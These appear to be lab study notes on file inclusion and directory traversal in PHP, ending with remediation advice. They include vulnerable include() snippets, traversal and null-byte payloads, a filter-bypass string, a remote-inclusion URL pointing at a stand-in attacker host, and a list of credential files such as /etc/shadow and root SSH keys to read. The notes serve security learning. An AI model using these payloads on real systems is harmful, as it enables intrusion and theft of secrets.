### Local File Inclusion

File inclusion vulnerabilities are often found and exploited in programming languages used for web applications.
The vulnerability itself is the lack of input validation, and can even lead to remote command execution.

PHP functions with commonly found vulnerabilities: include, require, include_once, require_once
Vulnerabilities are also found in ASP, JSP, or Node.js apps.


### Example

The following code:
<?PHP 
	include($_GET["lang"]);
?>

translates to the following HTTP request:
http://vulnerable_url/index.php?lang=EN.php

An attacker could exploit the LFI with the following input:
http://vulnerable_url/get.php?file=/etc/passwd 

If the developer requires the use of the lang parameter:
<?PHP 
	include("languages/". $_GET['lang']); 
?>

an attacker could use the following exploit:
http://vulnerable_url/index.php?lang=../../../../etc/passwd


### Error Messages

Providing invalid input will often result in similar error messages:
Warning: include(languages/THM.php): failed to open 
stream: No such file or directory in /var/www/html/vulnerable_url/index.php on line 12

This error message shows what the include function looks like: include(languages/THM.php);
We also know that it adds .php to the end of the entry.
This message also shows that web app directory path is /var/www/html/vulnerable_url/

This can be exploited using the ../ method, and by bypassing the added .php with %00
%00 tells the include function to ignore anything after the null byte (not current with PHP 5.3.4 and above)


### Filtering

If the developer filters some keywords or characters, there are some tricks to going around it, such as:
....//....//....//....//....//etc/passwd



### Remote File Inclusion

Similar to LFI, RFI occurs when the input is not properly sanitized, and allows for an attacker
to inject an external url into include function.
This requires that allow_url_fopen is on


### Example

An attacker hosts a PHP file on their own server: http://attacker.thm/cmd.txt
where cmd.txt contains the following code:
<?PHP echo "Hello Victim"; ?>

The attacker can inject their url: http://vulnerable_url/index.php?lang=http://attacker.thm/cmd.txt



### Directory Traversal
This web security vulnerability allows an attacker to read os resources. 
Locating and accessing files can be done through the url when the user's input is passed to file_get_contents in PHP.

### Example
With the entry point get.php?file=, the attacker can send the input ../../../../etc/passwd

### Common OS Files
- /etc/issue - contains a message or system identification to be printed before the login prompt.
- /etc/profile - controls system-wide default variables, such as Export variables, File creation mask (umask), Terminal types, Mail messages to indicate when new mail has arrived.
- /proc/version - specifies the version of the Linux kernel.
- /etc/passwd - has all registered user that has access to a system. 
- /etc/shadow - contains information about the system's users' passwords.
- /root/.bash_history - contains the history commands for root user.
- /var/log/dmessage - contains global system messages, including the messages that are logged during system startup.
- /var/mail/root - all emails for root user.
- /root/.ssh/id_rsa - 	Private SSH keys for a root or any known valid user on the server.
- /var/log/apache2/access.log - the accessed requests for Apache  webserver.
- C:\boot.ini - contains the boot options for computers with BIOS firmware.


### Remediation
1. Keep system and services, including web application frameworks, updated with the latest version.
2. Turn off PHP errors to avoid leaking the path of the application and other potentially revealing information.
3. A Web Application Firewall is a good option to help mitigate web application attacks.
4. Disable some PHP features that cause file inclusion vulnerabilities if your web app doesn't need them, such as allow_url_fopen on and allow_url_include.
5. Carefully analyze the web application and allow only protocols and PHP wrappers that are in need.
6. Never trust user input, and make sure to implement proper input validation against file inclusion.
7. Implement whitelisting for file names and locations as well as blacklisting.
